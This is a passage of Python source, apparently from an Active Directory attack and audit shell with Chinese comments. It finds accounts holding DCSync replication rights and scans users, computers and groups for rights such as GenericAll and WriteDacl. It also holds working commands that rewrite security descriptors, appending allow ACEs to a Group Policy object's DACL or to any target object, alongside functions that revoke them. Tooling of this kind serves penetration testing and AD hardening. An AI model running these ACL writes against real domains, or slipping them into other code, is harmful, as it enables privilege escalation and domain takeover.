        controls = security_descriptor_control(sdflags=0x04)

        self.client.search(
            self.domain_dumper.root,
            '(objectCategory=domain)',
            attributes=['nTSecurityDescriptor'],
            controls=controls,
        )
        if not self.client.entries:
            raise Exception("Domain object not found")

        sd_data = self.client.entries[0]['nTSecurityDescriptor'].raw_values[0]
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)

        repl_changes_bin = string_to_bin(REPL_GET_CHANGES)
        repl_changes_all_bin = string_to_bin(REPL_GET_CHANGES_ALL)

        candidates = {}
        for ace in sd['Dacl'].aces:
            try:
                if ace['AceType'] != ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
                    continue
                obj_type = ace['Ace']['ObjectType']
                sid = ace['Ace']['Sid'].formatCanonical()
                if sid not in candidates:
                    candidates[sid] = {'get_changes': False, 'get_changes_all': False}
                if obj_type == repl_changes_bin:
                    candidates[sid]['get_changes'] = True
                elif obj_type == repl_changes_all_bin:
                    candidates[sid]['get_changes_all'] = True
            except Exception:
                continue

        dcsync_sids = {sid: f for sid, f in candidates.items()
                       if f['get_changes'] and f['get_changes_all']}
        if not dcsync_sids:
            print_warn("No objects with DCSync privileges found")
            return

        rows = []
        for sid in dcsync_sids:
            resolved = self._resolve_sid(sid)
            rows.append([resolved or '-', sid])

        print_table(['AccountName', 'SID'], rows)

    # ── write_gpo_dacl ────────────────────────────────────────
    def do_write_gpo_dacl(self, line):
        """write_gpo_dacl <user> <gpo_sid> — 写入 GPO DACL"""
        args = parse_args(line, 2, 2, "write_gpo_dacl jsmith {31B2F340-016D-11D2-945F-00C04FB984F9}")

        controls = security_descriptor_control(sdflags=0x04)

        self.client.search(
            self.domain_dumper.root,
            '(&(objectClass=person)(sAMAccountName=%s))' % escape_filter_chars(args[0]),
            attributes=['objectSid'],
        )
        if not self.client.entries:
            raise Exception("User not found: %s" % args[0])
        user = self.client.entries[0]

        self.client.search(
            self.domain_dumper.root,
            '(&(objectClass=groupPolicyContainer)(name=%s))' % escape_filter_chars(args[1]),
            attributes=['objectSid', 'nTSecurityDescriptor'],
            controls=controls,
        )
        if not self.client.entries:
            raise Exception("GPO not found: %s" % args[1])
        gpo = self.client.entries[0]

        sec_desc_data = gpo['nTSecurityDescriptor'].raw_values[0]
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sec_desc_data)
        sd['Dacl'].aces.append(create_allow_ace(str(user['objectSid'])))
        data = sd.getData()

        # [Fix #10] 使用 list 而非 tuple
        self.client.modify(
            gpo.entry_dn,
            {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [data]]},
            controls=controls,
        )
        check_result(self.client, "GPO DACL modified for %s" % args[0])

    # ═══════════════════════════════════════════════════════════
    #  ACL 撤销操作
    # ═══════════════════════════════════════════════════════════

    # ── remove_dcsync ───────────────────────────────────────
    def do_remove_dcsync(self, line):
        """remove_dcsync <user> — 撤销用户的 DCSync 权限"""
        args = parse_args(line, 1, 1, "remove_dcsync jsmith")

        target = get_entry(self.client, self.domain_dumper, args[0],
                           ['sAMAccountName', 'objectSid'])
        if not target:
            raise Exception("Target not found: %s" % args[0])

        target_sid = str(target['objectSid'].value)
        target_name = target['sAMAccountName'].value
        print_found("Target: %s (%s)" % (target_name, target_sid))

        controls = security_descriptor_control(sdflags=0x04)
        self.client.search(
            self.domain_dumper.root,
            '(objectCategory=domain)',
            attributes=['nTSecurityDescriptor'],
            controls=controls,
        )
        if not self.client.entries:
            raise Exception("Domain object not found")

        domain_dn = self.client.entries[0].entry_dn
        sd_data = self.client.entries[0]['nTSecurityDescriptor'].raw_values[0]
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)

        repl_changes_bin = string_to_bin(REPL_GET_CHANGES)
        repl_changes_all_bin = string_to_bin(REPL_GET_CHANGES_ALL)

        new_aces = []
        removed = 0
        for ace in sd['Dacl'].aces:
            try:
                sid = ace['Ace']['Sid'].formatCanonical()
                if sid != target_sid:
                    new_aces.append(ace)
                    continue
                if ace['AceType'] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
                    obj_type = ace['Ace']['ObjectType']
                    if obj_type in (repl_changes_bin, repl_changes_all_bin):
                        removed += 1
                        continue
                new_aces.append(ace)
            except Exception:
                new_aces.append(ace)

        if removed == 0:
            print_warn("No DCSync ACEs found for %s" % target_name)
            return

        sd['Dacl'].aces = new_aces

        self.client.modify(
            domain_dn,
            {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
            controls=controls,
        )
        check_result(self.client, "DCSync revoked for %s (removed %d ACE(s))" % (target_name, removed))

    # ── revoke_ace ──────────────────────────────────────────
    def do_revoke_ace(self, line):
        """revoke_ace <target> <grantee> — 移除 grantee 对 target 的直接 ACE (不含继承)"""
        args = parse_args(line, 2, 2, "revoke_ace <target> <grantee>")

        controls = security_descriptor_control(sdflags=0x04)

        target = get_entry(self.client, self.domain_dumper, args[0],
                           ['sAMAccountName', 'objectSid', 'nTSecurityDescriptor'],
                           controls=controls)
        if not target:
            raise Exception("Target not found: %s" % args[0])

        grantee = get_entry(self.client, self.domain_dumper, args[1], ['objectSid'])
        if not grantee:
            raise Exception("Grantee not found: %s" % args[1])

        grantee_sid = str(grantee['objectSid'].value)
        target_name = target['sAMAccountName'].value

        print_found("Target: %s (%s)" % (target_name, target.entry_dn))
        print_found("Grantee: %s (%s)" % (args[1], grantee_sid))

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['nTSecurityDescriptor'].raw_values[0])
        except (IndexError, KeyError):
            raise Exception("Unable to read security descriptor")

        new_aces = []
        removed = 0
        for ace in sd['Dacl'].aces:
            try:
                # [Fix #4] 保留继承的 ACE，只移除直接授予的
                if ace['AceFlags'] & INHERITED_ACE_FLAG:
                    new_aces.append(ace)
                    continue
                sid = ace['Ace']['Sid'].formatCanonical()
                if sid == grantee_sid:
                    removed += 1
                    continue
            except Exception:
                pass
            new_aces.append(ace)

        if removed == 0:
            print_warn("No direct ACEs found for %s on %s" % (args[1], target_name))
            return

        sd['Dacl'].aces = new_aces

        self.client.modify(
            target.entry_dn,
            {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
            controls=controls,
        )
        check_result(self.client, "Removed %d direct ACE(s): %s -> %s" % (removed, args[1], target_name))

    # ═══════════════════════════════════════════════════════════
    #  内部辅助
    # ═══════════════════════════════════════════════════════════

    def _grant_ace(self, target_sam, grantee_sam, ace_factory, edge_label):
        """
        通用 ACL 授予操作。

        Parameters:
            target_sam  — 目标对象 sAMAccountName
            grantee_sam — 被授权者 sAMAccountName
            ace_factory — callable(grantee_sid) -> ACE
            edge_label  — 权限标签 (如 'GenericWrite')
        """
        controls = security_descriptor_control(sdflags=0x04)

        target = get_entry(self.client, self.domain_dumper, target_sam,
                           ['sAMAccountName', 'objectSid', 'nTSecurityDescriptor'],
                           controls=controls)
        if not target:
            raise Exception("Target not found: %s" % target_sam)

        grantee = get_entry(self.client, self.domain_dumper, grantee_sam, ['objectSid'])
        if not grantee:
            raise Exception("Grantee not found: %s" % grantee_sam)

        grantee_sid = str(grantee['objectSid'].value)
        target_name = target['sAMAccountName'].value

        print_found("Target: %s (%s)" % (target_name, target.entry_dn))
        print_found("Grantee: %s (%s)" % (grantee_sam, grantee_sid))

        try:
            sd_data = target['nTSecurityDescriptor'].raw_values[0]
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
        except (IndexError, KeyError):
            # [Fix #9] 警告并要求 LDAPS — 不再静默清除权限
            print_warn("Cannot read target security descriptor — "
                       "this usually means LDAPS is required for nTSecurityDescriptor access")
            raise Exception("Unable to read nTSecurityDescriptor. Try: start_tls")

        sd['Dacl'].aces.append(ace_factory(grantee_sid))

        self.client.modify(
            target.entry_dn,
            {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
            controls=controls,
        )
        check_result(self.client, "%s now has %s on %s" % (grantee_sam, edge_label, target_name))

    def _get_acl_exclusions(self):
        """获取 ACL 审计排除的 SID 集合 (默认高权限主体，减少噪音)"""
        excluded = set(_NOISY_WELL_KNOWN)

        # 懒查询 domain_sid（首次调用时自动获取并缓存）
        domain_sid = getattr(self, 'domain_sid', '')
        if not domain_sid:
            try:
                self.client.search(
                    self.domain_dumper.root,
                    '(objectClass=domain)',
                    attributes=['objectSid'],
                )
                if self.client.entries:
                    domain_sid = str(self.client.entries[0]['objectSid'].value)
                    self.domain_sid = domain_sid
            except Exception:
                pass
        if domain_sid:
            for rid in _NOISY_RIDS:
                excluded.add('%s-%d' % (domain_sid, rid))

        # [Fix #8 注释] 这里添加 S-1-5-32-RID 虽然部分 RID 不对应真实内置组，
        # 但作为防御性过滤是安全的 (S-1-5-32-512 不存在，不影响)
        for rid in _NOISY_RIDS:
            excluded.add('S-1-5-32-%d' % rid)

        try:
            self.client.search(
                self.domain_dumper.root,
                '(userAccountControl:1.2.840.113556.1.4.803:=8192)',
                attributes=['objectSid'],
            )
            for entry in self.client.entries:
                try:
                    excluded.add(str(entry['objectSid'].value))
                except Exception:
                    pass
        except Exception:
            pass

        return excluded

    def _find_ace_with_mask(self, target_mask, label):
        """通用：扫描所有对象寻找拥有特定 mask 的 ALLOW ACE"""
        print_info("Searching for %s rights..." % label)
        excluded = self._get_acl_exclusions()
        controls = security_descriptor_control(sdflags=0x04)
        rows = []

        for obj_class in ['user', 'computer', 'group']:
            # [Fix #2] 使用 paged_search 避免截断
            entries = paged_search(
                self.client, self.domain_dumper.root,
                _CLASS_FILTERS.get(obj_class, '(objectClass=%s)' % obj_class),
                attributes=['sAMAccountName', 'nTSecurityDescriptor'],
                controls=controls,
            )
            for entry in entries:
                try:
                    sd_data = entry['nTSecurityDescriptor'].raw_values[0]
                    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
                    for ace in sd['Dacl'].aces:
                        try:
                            # [Fix #1] 只匹配 ALLOW ACE
                            if not _is_allow_ace(ace):
                                continue
                            mask = ace['Ace']['Mask']['Mask']
                            # [Fix #3] AllExtendedRights 只匹配非 Object ACE
                            if label == 'AllExtendedRights':
                                if ace['AceType'] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
                                    continue
                            if mask & target_mask == target_mask:
                                sid = ace['Ace']['Sid'].formatCanonical()
                                if sid in excluded:
                                    continue
                                resolved = self._resolve_sid(sid)
                                rows.append([entry['sAMAccountName'].value, resolved or sid, label])
                        except Exception:
                            continue
                except (IndexError, KeyError):
                    continue

        if not rows:
            print_warn("No %s permissions found" % label)
            return

        print_table(['Target', 'Trustee', 'Right'], rows)

    def _find_object_ace(self, mask_flag, guid_str, label, obj_classes=None):
        """通用：扫描指定类型对象寻找具有特定 mask+GUID 的 ALLOW Object ACE"""
        print_info("Searching for %s rights..." % label)
        excluded = self._get_acl_exclusions()
        controls = security_descriptor_control(sdflags=0x04)
        guid_bin = string_to_bin(guid_str)
        rows = []

        if obj_classes is None:
            obj_classes = ['user', 'computer', 'group']

        for obj_class in obj_classes:
            # [Fix #2] 使用 paged_search 避免截断
            entries = paged_search(
                self.client, self.domain_dumper.root,
                _CLASS_FILTERS.get(obj_class, '(objectClass=%s)' % obj_class),
                attributes=['sAMAccountName', 'nTSecurityDescriptor'],
                controls=controls,
            )
            for entry in entries:
                try:
                    sd_data = entry['nTSecurityDescriptor'].raw_values[0]
                    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
                except (IndexError, KeyError):
                    continue

                target_sam = entry['sAMAccountName'].value

                for ace in sd['Dacl'].aces:
                    try:
                        # [Fix #1] 只匹配 ALLOW ACE
                        if not _is_allow_ace(ace):
                            continue
                        mask = ace['Ace']['Mask']['Mask']
                        sid = ace['Ace']['Sid'].formatCanonical()

                        if sid in excluded:
                            continue

                        is_obj_ace = (ace['AceType'] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE)

                        # 1) Object ACE with specific GUID
                        if is_obj_ace:
                            if (mask & mask_flag) and ace['Ace']['ObjectType'] == guid_bin:
                                resolved = self._resolve_sid(sid)
                                rows.append([target_sam, resolved or sid, label])
                            continue  # Object ACE 只走上面路径，不走 GenericAll 隐含推断

                        # 2) 非 Object ACE: GenericAll 隐含一切权限
                        if mask & 0x000f01ff == 0x000f01ff:
                            resolved = self._resolve_sid(sid)
                            rows.append([target_sam, resolved or sid, '%s (via GenericAll)' % label])
                    except Exception:
                        continue

        if not rows:
            print_warn("No %s permissions found" % label)
            return

        print_table(['Target', 'Trustee', 'Right'], rows)

    @staticmethod
    def _decode_mask(mask):
        """[Fix #5] 将 ACL mask 解码为人类可读的权限列表，无重叠"""
        perms = []
        # GenericAll 包含一切，优先判断并独占
        if mask & 0x000f01ff == 0x000f01ff:
            return ['GenericAll']
        # 按从高到低的粒度依次判断
        if mask & 0x00040000:
            perms.append('WriteDacl')
        if mask & 0x00080000:
            perms.append('WriteOwner')
        # GenericWrite (BloodHound 标准: 0x00020094)
        if mask & 0x00020094 == 0x00020094:
            perms.append('GenericWrite')
        if mask & 0x00000100:
            perms.append('AllExtendedRights')
        if mask & 0x00000020:
            perms.append('WriteProperty')
        if mask & 0x00000010:
            perms.append('ReadProperty')
        if mask & 0x00000008:
            perms.append('ValidatedWrite')
        return perms
